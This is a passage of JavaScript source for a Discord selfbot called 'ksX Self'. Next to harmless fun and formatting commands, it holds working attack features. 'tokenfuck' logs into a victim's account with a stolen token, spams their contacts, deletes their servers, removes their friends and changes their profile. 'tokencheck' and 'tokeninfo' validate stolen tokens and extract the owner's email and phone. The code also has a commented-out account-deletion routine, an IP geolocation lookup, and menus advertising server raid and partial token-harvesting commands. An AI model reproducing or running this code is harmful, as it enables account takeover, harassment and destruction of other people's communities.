                            body
                        } = await superagent.get(`https://nekos.life/api/v2/img/slap`);
                        if (!user) {
                            const embed = new Discord.RichEmbed()
                                .setTitle('__**SLAP**__')
                                .setDescription("**" + client.user.username + " slapped itself..**")
                                .setColor(color)
                                .setImage(body.url)
                                .setFooter("ksX Self", client.user.avatarURL)
                            message.edit(embed)
                        } else {
                            const embed = new Discord.RichEmbed()
                                .setTitle('__**SLAP**__')
                                .setDescription("**You just slapped " + user.username + "**")
                                .setColor(color)
                                .setImage(body.url)
                                .setFooter("ksX Self", client.user.avatarURL)
                            message.edit(embed)
                        }
                    }
                }

                if (message.content.startsWith(prefix + "hug")) {
                    if (message.author.id === client.user.id) {

                        let user = message.mentions.users.first()
                        const {
                            body
                        } = await superagent.get(`https://nekos.life/api/v2/img/hug`);
                        if (!user) return message.edit('Please mention someone!')
                        const embed = new Discord.RichEmbed()
                            .setTitle('__**HUG**__')
                            .setDescription("**You hug " + user.username + "**")
                            .setColor(color)
                            .setImage(body.url)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "neko")) {
                    if (message.author.id === client.user.id) {

                        let user = message.mentions.users.first()
                        const {
                            body
                        } = await superagent.get(`https://nekos.life/api/v2/img/neko`);
                        const embed = new Discord.RichEmbed()
                            .setTitle('__**NEKO**__')
                            .setDescription("**Neko image!**")
                            .setColor(color)
                            .setImage(body.url)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "feed")) {
                    if (message.author.id === client.user.id) {
                        let user = message.mentions.users.first()
                        const {
                            body
                        } = await snekfecth.get(`https://nekos.life/api/v2/img/feed`);
                        if (!user) return message.edit('Please mention someone!')
                        const embed = new Discord.RichEmbed()
                            .setTitle('__**FEED**__')
                            .setDescription("**You fed " + user.username + "**")
                            .setColor(color)
                            .setImage(body.url)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(embed)
                    }
                }

                if (message.content.startsWith(prefix + "tokencheck")) {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!args) return message.edit('Please provide a token to check')
                            let url = "https://discordapp.com/api/v8/users/@me";
                            request(
                                url, {
                                    method: "GET",
                                    headers: {
                                        authorization: args
                                    }
                                },
                                function (error, response, body) {
                                    if (response.statusCode === 200) {
                                        var yes = new Discord.RichEmbed()
                                            .setTitle("**Token**")
                                            .setDescription("The token: \n**" + args + "**\nis working!")
                                            .setColor(color)
                                            .setImage(image)
                                            .setFooter("ksX Self", client.user.avatarURL)
                                        message.edit(yes)
                                    } else {
                                        var no = new Discord.RichEmbed()
                                            .setTitle("**Token**")
                                            .setDescription("The token: \n**" + args + "**\nis not working!")
                                            .setColor(color)
                                            .setImage(image)
                                            .setFooter("ksX Self", client.user.avatarURL)
                                        message.edit(no)
                                    }
                                })
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokencheck`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokencheck` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                /*if (message.content.startsWith(prefix + "tokendelete")) {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            var tokenedn = message.content.split(" ").slice(0);
                            var targetedtoken = tokenedn[1]
                            if (!targetedtoken) return message.edit('Please provide a token!')

                            request(
                                url, {
                                    method: "GET",
                                    headers: {
                                        authorization: targetedtoken
                                    }
                                },
                                function (error, response, body) {
                                    if (response.statusCode === 200) {
                                        let checked = new Discord.Client()
                                        if (checked.login(targetedtoken)) {

                                            for (var i = 20; i >= 0; i--) {
                                                fetch('https://discord.com/api/v8/users/@me/delete', {
                                                    headers: {
                                                        "authorization": targetedtoken,
                                                        "content-type": 'application/json',
                                                    },
                                                    body: '{"password":""}',
                                                    method: 'POST',
                                                }).catch(error => {
                                                    return console.log("[Token delete] →".yellow) ^ console.log("an error occurred!".red)
                                                })
                                            }

                                        } else {
                                            message.edit("Check logs!")
                                            console.log("Can't connect to the token you provided!")
                                        }
                                    } else {
                                        var no = new Discord.RichEmbed()
                                            .setTitle("**Token Infos**")
                                            .setDescription("The token you provided is not valid!")
                                            .setColor(color)
                                            .setImage(image)
                                            .setFooter("ksX Self", client.user.avatarURL)
                                        message.edit(no)
                                    }
                                })
                        }
                    }
                }*/


                if (message.content === prefix + "defaultrpc") {
                    if (message.author.id === client.user.id) {
                        if (rpc.includes("on")) {
                            var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
                            rpcGenerator.getRpcImage("787775152615194635", "ksxlogo")
                                .then(image => {
                                    let presence = new rpcGenerator.Rpc()
                                        .setName("ksX")
                                        .setUrl(stream)
                                        .setType("STREAMING")
                                        .setApplicationId("787775152615194635")
                                        .setAssetsLargeImage(image.id)
                                        .setAssetsLargeText(`ksX Glaf, Chakal`)
                                        .setDetails("ksX")
                                        .setJoinSecret("MTI4NzM0OjFpMmhuZToxMjMxMjM=")
                                        .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                        .setSpectateSecret('MTIzNDV8MTIzNDV8MTMyNDU0')
                                        .setStartTimestamp(Date.now())

                                        .setParty({
                                            id: uuid()
                                        })

                                    client.user.setPresence(presence.toDiscord())
                                })
                            message.edit('default rpc setted')
                        } else {
                            message.edit('Please activate the rpc in config.js').then(msg => msg.delete(4000))
                        }
                    }
                }

                if (message.content.startsWith(prefix + "tokenfuck")) {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            var tokenn = message.content.split(" ").slice(0);
                            var tokentargeted = tokenn[1]
                            if (!tokentargeted) return message.edit('Please provide a token!')
                            let guildsname = ["FUCKED BY KSX", "KSX FUCKED YOU", "KSX PROJECT", "TOKEN FUCKED", "TOKEN REAPED"]
                            let avatars = [
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987145426665512/discord.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987145262825544/dd8b92-1595199037.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987147088265216/image0.jpg",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987150044463114/nitro.jpg",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987152179888138/image1.png",
                                "https://cdn.discordapp.com/attachments/730742699375722546/769987154587287572/urfath.png"
                            ]
                            let languages = [
                                "pl",
                                "da",
                                "vi",
                                "th",
                                "ru"
                            ]
                            let language = languages[Math.floor(Math.random() * (languages.length - 1))]
                            let avatar = avatars[Math.floor(Math.random() * (avatars.length - 1))]
                            let url = "https://discordapp.com/api/v8/users/@me";
                            request(
                                url, {
                                    method: "GET",
                                    headers: {
                                        authorization: tokentargeted
                                    }
                                },
                                function (error, response, body) {
                                    if (response.statusCode === 200) {
                                        let checked = new Discord.Client()
                                        if (checked.login(tokentargeted)) {


                                            checked.on('ready', function () {
                                                checked.users.forEach(user => {
                                                    user.send('Account reaped by ksX\nhttps://discord.gg/wkmjxZ285x').catch(error => {
                                                        return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                    })
                                                })
                                                checked.user.setAvatar(avatar).catch(error => {
                                                    return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                })
                                                checked.user.friends.forEach((f) => {
                                                    checked.user.removeFriend(f).catch(error => {
                                                        return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                    })
                                                })
                                                checked.guilds.forEach((guilds) => {
                                                    if (guilds.ownerID === checked.user.id) {
                                                        guilds.delete()
                                                            .catch(error => {

                                                                return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                            })
                                                    } else {
                                                        guilds.leave()
                                                            .catch(error => {

                                                                return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                            })
                                                    }
                                                    message.edit('Fucking token..').then(m => message.edit('Token fucked!'))
                                                })

                                                for (var i = 20; i >= 0; i--) {
                                                    fetch('https://discord.com/api/v8/users/@me/settings', {
                                                        headers: {
                                                            "authorization": tokentargeted,
                                                            "content-type": 'application/json',
                                                        },
                                                        body: '{"theme":"light"}',
                                                        method: 'PATCH',
                                                    }).catch(error => {
                                                        return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                    })
                                                    fetch('https://discord.com/api/v8/users/@me/settings', {
                                                        method: 'PATCH',
                                                        headers: {
                                                            "authorization": tokentargeted,
                                                            "content-type": 'application/json',
                                                        },
                                                        body: `{"locale": "${language}"}`,
                                                        method: 'PATCH',
                                                    }).catch(error => {
                                                        return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                    })
                                                }
                                            });
                                            checked.on('ready', function () {
                                                checked.user.setUsername(guildsname[Math.floor(Math.random() * (guildsname.length - 1))])
                                                console.log("Connected to: \n\"".green + token.green + "\"!".green)
                                                for (var i = 100; i >= 0; i--) {
                                                    checked.user.createGuild(guildsname[Math.floor(Math.random() * (guildsname.length - 1))], 'russia').catch(error => {
                                                        return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                                    })
                                                }
                                            })
                                        } else {
                                            message.edit("Check logs!")
                                            console.log("Can't connect to the token you provided!")
                                        }
                                    } else {
                                        var no = new Discord.RichEmbed()
                                            .setTitle("**Token Infos**")
                                            .setDescription("The token you provided is not valid!")
                                            .setColor(color)
                                            .setImage(image)
                                            .setFooter("ksX Self", client.user.avatarURL)
                                        message.edit(no)
                                    }
                                })
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokenfuck`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokenfuck` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                /*if (message.content.startsWith(prefix + "leaveguild")) {
                    client.guilds.forEach((guilds) => {
                        if (guilds.ownerID === client.user.id) {
                            guilds.delete()
                                .catch(error => {

                                    return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                })
                        } else {
                            guilds.leave()
                                .catch(error => {

                                    return console.log("[Token Fucker] →".yellow) ^ console.log("an error occurred!".red)
                                })
                        }
                        message.edit('Fucking token..').then(m => message.edit('Token fucked!'))
                    })
                }*/



                if (message.content.startsWith(prefix + 'tokeninfo')) {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!args) return message.edit('Please provide a token')
                            new Promise((resolve, reject) => {
                                let url = 'https://discordapp.com/api/v8/users/@me';
                                request(url, {
                                        method: 'GET',
                                        headers: {
                                            authorization: args
                                        }
                                    },
                                    function (error, response, body) {
                                        body = JSON.parse(body);
                                        var id = body["id"];
                                        var username = body["username"];
                                        var avatar = body["avatar"];
                                        var languages = body["locale"];
                                        var email = body["email"];
                                        var phone = body["phone"];
                                        var htag = body["discriminator"];
                                        var mfa = body["mfa_enabled"];
                                        var verified = body["verified"];
                                        var public_flags = body["public_flags"];
                                        var flags = body["flags"];
                                        var nitrosince = body["premium_since"];

                                        if (languages === "da") {
                                            var language = "Danish"
                                        }
                                        if (languages === "de") {
                                            var language = "German"
                                        }
                                        if (languages === "en-GB") {
                                            var language = "English, UK"
                                        }
                                        if (languages === "en-US") {
                                            var language = "English, US"
                                        }
                                        if (languages === "es-ES") {
                                            var language = "Spanish"
                                        }
                                        if (languages === "fr") {
                                            var language = "French"
                                        }
                                        if (languages === "hr") {
                                            var language = "Croatian"
                                        }
                                        if (languages === "it") {
                                            var language = "Italian"
                                        }
                                        if (languages === "lt") {
                                            var language = "Lithuanian"
                                        }
                                        if (languages === "hu") {
                                            var language = "hungarian"
                                        }
                                        if (languages === "nl") {
                                            var language = "Dutch"
                                        }
                                        if (languages === "no") {
                                            var language = "Norwegian"
                                        }
                                        if (languages === "pl") {
                                            var language = "Polish"
                                        }
                                        if (languages === "pt-BR") {
                                            var language = "Portuguese, Brazilian"
                                        }
                                        if (languages === "ro") {
                                            var language = "Romanian, Romania"
                                        }
                                        if (languages === "fi") {
                                            var language = "Finnish"
                                        }
                                        if (languages === "sv-SE") {
                                            var language = "Swedish"
                                        }
                                        if (languages === "vi") {
                                            var language = "Vietnamese"
                                        }
                                        if (languages === "tr") {
                                            var language = "Turkish"
                                        }
                                        if (languages === "cs") {
                                            var language = "Czech"
                                        }
                                        if (languages === "el") {
                                            var language = "Greek"
                                        }
                                        if (languages === "bg") {
                                            var language = "Bulgarian"
                                        }
                                        if (languages === "ru") {
                                            var language = "Russian"
                                        }
                                        if (languages === "uk") {
                                            var language = "Ukrainian"
                                        }
                                        if (languages === "th") {
                                            var language = "Thai"
                                        }
                                        if (languages === "zh-CN") {
                                            var language = "Chinese, China"
                                        }
                                        if (languages === "ja") {
                                            var language = "Japanese"
                                        }
                                        if (languages === "zh-TW") {
                                            var language = "Chinese, Taiwan"
                                        }
                                        if (languages === "ko") {
                                            var language = "Korean"
                                        }

                                        var embeded = "";
                                        embeded += "\nUser: **" + username + "#" + htag + "**";
                                        embeded += "\nID: **" + id + "**";
                                        embeded += "\nAvatar: **" + avatar + "**";
                                        embeded += "\nEmail: **" + email + "**";
                                        embeded += "\nAccount verified: **" + verified + "**";
                                        embeded += "\nPhone: **" + phone + "**";
                                        embeded += "\nNitro since: **" + nitrosince + "**";
                                        embeded += "\n2FA activated: **" + mfa + "**";
                                        embeded += "\nAccount langague: **" + language + "**";
                                        embeded += "\nPublics flags: **" + public_flags + "**";
                                        embeded += "\nFlags: **" + flags + "**";
                                        var infos = new Discord.RichEmbed()
                                            .setTitle("**Token infos**")
                                            .setDescription(embeded)
                                            .setColor(color)
                                            .setImage(image)
                                            .setFooter("ksX Self", client.user.avatarURL)
                                        return message.edit(infos)
                                    }
                                );
                            });
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokeninfos`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `tokeninfos` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content.startsWith(prefix + 'say')) {
                    if (message.author.id === client.user.id) {
                        if (!message.guild) return message.edit('You cannot use this command out of a server');

                        let user = message.mentions.users.first();
                        let args = message.content.split(" ").slice(2);

                        if (!user) return message.edit('Please mention someone or you!')

                        message.delete();
                        let webmessage = args.join(" ")
                        message.channel.createWebhook(user.username, user.displayAvatarURL)
                            .then(webhook => {
                                const user = new Discord.WebhookClient(webhook.id, webhook.token)
                                user.send(webmessage);
                                user.delete()
                            })
                    }
                }

                if (message.content.startsWith(prefix + "iplookup")) {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            if (!args) return message.edit('Please provide an ip')
                            snekfetch.get('http://ip-api.com/json/' + args + "?fields=status,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,currency,isp,org,mobile,proxy,hosting,query").then(r => {
                                var query = r.body["query"];
                                var status = r.body["status"];
                                var continent = r.body["continent"];
                                var continentCode = r.body["continentCode"];
                                var country = r.body["country"];
                                var countryCode = r.body["countryCode"];
                                var regionName = r.body["regionName"];
                                var region = r.body["region"];
                                var city = r.body["city"];
                                var tz = r.body["timezone"];
                                var lat = r.body["lat"];
                                var lon = r.body["lon"];
                                var isp = r.body["isp"];
                                var org = r.body["org"];
                                var mobile = r.body["mobile"];
                                var proxy = r.body["proxy"];
                                var hosting = r.body["hosting"];

                                let ipembed = new Discord.RichEmbed()
                                    .setTitle("**IP Lookup**")
                                    .setColor(color)
                                    .addField('IP:', query)
                                    .addField('Status:', status)
                                    .addField('Continent:', continent + " (" + continentCode + ")")
                                    .addField('Country:', country + " (" + countryCode + ")")
                                    .addField('Region:', regionName + " (" + region + ")")
                                    .addField('City', city)
                                    .addField('Timezone:', tz)
                                    .addField('Latitude / Longitude:', lat + " / " + lon)
                                    .addField('ISP:', isp)
                                    .addField('Mobile?:', mobile)
                                    .addField('Proxy?:', proxy)
                                    .addField('Hosting?:', hosting)
                                    .setImage(image)
                                    .setFooter("ksX Self", client.user.avatarURL)
                                if (!org) {
                                    ipembed.addField('ORG:', "Null")
                                } else {
                                    ipembed.addField('ORG:', org)
                                }
                                message.edit(ipembed)
                            });
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `iplookup`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `iplookup` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content.startsWith(prefix + 'orange')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit(args, {
                            code: "fix"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'green')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit(args, {
                            code: "css"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'cyan')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit("\"" + args + "\"", {
                            code: "bash"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'blue')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit("[" + args + "]", {
                            code: "ini"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'red')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit("- " + args, {
                            code: "diff"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'yellow')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit(args, {
                            code: "fix"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'py')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit(args, {
                            code: "py"
                        })

                    }
                }

                if (message.content.startsWith(prefix + 'js')) {
                    if (message.author.id === client.user.id) {

                        if (!args) return message.edit('Please provide a text')

                        message.edit(args, {
                            code: "js"
                        })

                    }
                }

                if (message.content === prefix + "bigwave") {
                    if (message.author.id === client.user.id) {
                        message.edit(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                        message.channel.send(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                        message.channel.send(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                        message.channel.send(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                        message.channel.send(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                        message.channel.send(`
big wave
 big wave
  big wave
   big wave
    big wave
     big wave
       big wave
         big wave
           big wave
             big wave
               big wave
                  big wave
                     big wave
                        big wave
                           big wave
                             big wave
                               big wave
                                 big wave
                                   big wave
                                     big wave
                                      big wave
                                       big wave
                                        big wave
                                         big wave
                                          big wave
                                          big wave
                                          big wave
                                          big wave
                                         big wave
                                        big wave
                                       big wave
                                      big wave
                                     big wave
                                   big wave
                                 big wave
                               big wave
                             big wave
                           big wave
                        big wave
                     big wave
                  big wave
               big wave
             big wave
           big wave
         big wave
       big wave
     big wave
    big wave 
   big wave
 big wave
 big wave
big wave
big wave
                    `)
                    }
                }

                if (message.content === prefix + 'multistream') {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            setInterval(function () {
                                client.user.setActivity(multistat[Math.floor(Math.random() * multistat.length)], {
                                    type: "STREAMING",
                                    url: stream
                                });
                            }, 3000);
                            message.edit("Your now multistreaming **" + config.multistatus.length + "** status!")
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `multistream`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `multistream` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                if (message.content === prefix + 'multistatus') {
                    if (message.author.id === client.user.id) {
                        if (premium) {
                            setInterval(function () {
                                client.user.setActivity(multistat[Math.floor(Math.random() * multistat.length)])

                            }, 3000);
                            message.edit("You now have **" + config.multistatus.length + "** status displaying!")
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `multistream`')
                        } else {
                            cmdlogs.send("**" + client.user.tag + '** Did the command : `multistream` But he don\'t have **ksX premium**!')
                            return message.edit(notpremium)
                        }
                    }
                }

                let search = message.content.split(` `).slice(1).join("+")
                if (message.content.startsWith(prefix + "googlesearch")) {
                    if (!search) return message.edit('Please specifie a text!')
                    message.edit('https://www.google.com/search?q=' + search)
                }

                if (message.content.startsWith(prefix + "youtubesearch")) {
                    if (!search) return message.edit('Please specifie a text!')
                    message.edit('https://www.youtube.com/results?search_query=' + search)
                }

                if (message.content.startsWith(prefix + "pornhubsearch")) {
                    if (!search) return message.edit('Please specifie a text!')
                    message.edit('https://www.pornhub.com/video/search?search=' + search)
                }

                if (message.content.startsWith(prefix + "ascii")) {
                    if (message.author.id === client.user.id) {
                        if (!args) return message.edit("You need to specify a text.");
                        figlet.text(args, function (err, data) {
                            if (err) {
                                console.log('An error occurred!');
                                console.dir(err);
                            }
                            if (data.length > 2000) return message.edit('Please provide text shorter than 2000 characters')

                            message.edit('``' + data + '``')
                        })
                    }
                }

                if (message.content === prefix + "ksX") {
                    if (message.author.id === client.user.id) {
                        if (premium) {

                            let embed = new Discord.RichEmbed()
                                .setTitle("**You have the premium ! :white_check_mark:**")
                                .setURL("https://discord.gg/wkmjxZ285x")
                                .addField('ksX selfbot creators are: ', creators)
                                .addField("Version", selfv)
                            message.edit(embed)
                        } else {
                            let embed = new Discord.RichEmbed()
                                .setTitle("**You don't have the premium !**")
                                .setURL("https://discord.gg/wkmjxZ285x")
                                .setDescription('[Click on the link to buy the premium](https://discord.gg/wkmjxZ285x)')
                                .addField('ksX selfbot creators are: ', creators)
                                .addField("Version", selfv)
                            message.edit(embed)
                        }
                    }
                }

if (message.content === prefix + "szzdf") {
    return console.log('gr')
}
                if (message.content === prefix + "help") {
                    if (message.author.id === client.user.id) {
                        let helpembed = new Discord.RichEmbed()
                            .setTitle("**Help Page**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*help*`, "`Show Help menu.`")
                            .addField(`*fun*`, "`Show fun menu.`")
                            .addField(`*tools*`, "`Show tools menu.`")
                            .addField(`*raid*`, "`Show raid menu.`")
                            .addField(`*status*`, "`Show status menu.`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(helpembed)
                    }
                }

                if (message.content === prefix + "raid") {
                    if (message.author.id === client.user.id) {
                        let raidembed = new Discord.RichEmbed()
                            .setTitle("**Raid Page**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*spam*`, "`Spam everyone in all channels.`")
                            .addField(`*stopspam*`, "`Stop the spam.`")
                            .addField(`*masschan*    ${preMARK}`, "`Create mass channel.`")
                            .addField(`*delchan*    ${preMARK}`, "`Del all channel in the server.`")
                            .addField(`*kickall*    ${preMARK}`, "`Kick all (almost) members.`")
                            .addField(`*banall*    ${preMARK}`, "`Ban all (almost) members.`")
                            .addField(`*unbanall*    ${preMARK}`, "`Unban all members.`")
                            .addField(`*massroles*    ${preMARK}`, "`Create mass roles.`")
                            .addField(`*destroy*    ${preMARK}`, "`Destroy the server.`")
                            .addField(`*delserver*    ${preMARK}`, "`Delete current server (require owner permission and do not work with 2fa).`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(raidembed)
                    }
                }

                if (message.content === prefix + "fun") {
                    if (message.author.id === client.user.id) {
                        let funembed = new Discord.RichEmbed()
                            .setTitle("**Fun Page**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*poll*`, "`Make a poll.`")
                            .addField(`*hypesquad*`, "`Choose your hypesquad (bravery/brilliance/balance)`")
                            .addField(`*ascii*`, "`Set your text in ASCII.`")
                            .addField(`*bigwave*`, "`Send a big wave in the chat.`")
                            .addField(`*say*`, "`Send a message with a webhook* (you can mention you to make you say your message) *you need webhook permissions!`")
                            .addField(`*pepe*`, "`Send your or other members pepe size`")
                            .addField(`*8ball*`, "`Give to her your best question.`")
                            .addField(`*textmoji*`, "`Send message with letters emojis.`")
                            .addField(`*kiss*`, "`Kiss someone!`")
                            .addField(`*slap*`, "`Slap someone!`")
                            .addField(`*feed*`, "`Feed someone!`")
                            .addField(`*neko*`, "`Send a neko image`")
                            .addField(`*typing*`, "`Other members show you as typing a text.`")
                            .addField(`*red*`, "`Send a text in red.`")
                            .addField(`*orange*`, "`Send a text in orange.`")
                            .addField(`*green*`, "`Send a text in green.`")
                            .addField(`*cyan*`, "`Send a text in cyan.`")
                            .addField(`*blue*`, "`Send a text in blue.`")
                            .addField(`*yellow*`, "`Send a text in yellow.`")
                            .addField(`*py*`, "`Send a text in python.`")
                            .addField(`*js*`, "`Send a text in javascript.`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(funembed)
                    }
                }

                if (message.content === prefix + "tools") {
                    if (message.author.id === client.user.id) {
                        let toolsembed = new Discord.RichEmbed()
                            .setTitle("**Tools Page**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*restart*`, "`Restart the selfbot.`")
                            .addField(`*clearlogs*`, "`Clear the console.`")
                            .addField(`*afkon*`, "`Set to on the AFK.`")
                            .addField(`*afkoff*`, "`Set to off the AFK.`")
                            .addField(`*nitro*`, "`Gen a nitro link (just a link not a gift).`")
                            .addField(`*avatar*`, "`Show your avatar or show other people avatar.`")
                            .addField(`*setavatar*`, "`Set an avatar without go to settings.`")
                            .addField(`*setuseravatar*`, "`Steal other people avatar.`")
                            .addField(`*ping*`, "`Send your ping`")
                            .addField(`*clientinfos*`, "`Send you infos in the console.`")
                            .addField(`*ghostping*`, "`Ghostping everyone or someone. (e for everyone)`")
                            .addField(`*setprefix*`, "`Setup a new prefix (disapear when you restart)`")
                            .addField(`*setimage*`, "`Setup a new image`")
                            .addField(`*setcolor*`, "`Setup a new color`")
                            .addField(`*setstream*`, "`Setup a new link for multistream`")
                            .addField(`*noimage*`, "`Remove your image`")
                            .addField(`*nocolor*`, "`Remove your color`")
                            .addField(`*googlesearch*`, "`Search something.`")
                            .addField(`*youtubesearch*`, "`Search videos or channels on youtube`")
                            .addField(`*pornhubsearch*`, "`Search videos on pornhub`")
                            .addField(`*b64encode*`, "`Encode your text in base64.`")
                            .addField(`*b64decode*`, "`Decode base64 to text.`")
                            .addField(`*shorturl*`, "`Short an url.`")
                            .setImage(image)
                            .setFooter("ksX Self", client.user.avatarURL)
                        message.edit(toolsembed)
                    }
                }

                if (message.content === prefix + "tools") {
                    if (message.author.id === client.user.id) {
                        let toolsembed = new Discord.RichEmbed()
                            .setTitle("**Tools Page (2)**")
                            .setColor(color)
                            .setDescription("Prefix : ```" + prefix + "```")
                            .addField(`*tokenof*`, "`Get the half of token of everyone (token if the member don't have 2fa activated)`")
                            .addField(`*tokencheck*    ${preMARK}`, "`Check if a token is valid.`")
                            .addField(`*tokeninfos*    ${preMARK}`, "`Give you informations of a token.`")
                            .addField(`*tokenfuck*    ${preMARK}`, "`Fucked up a token.`")
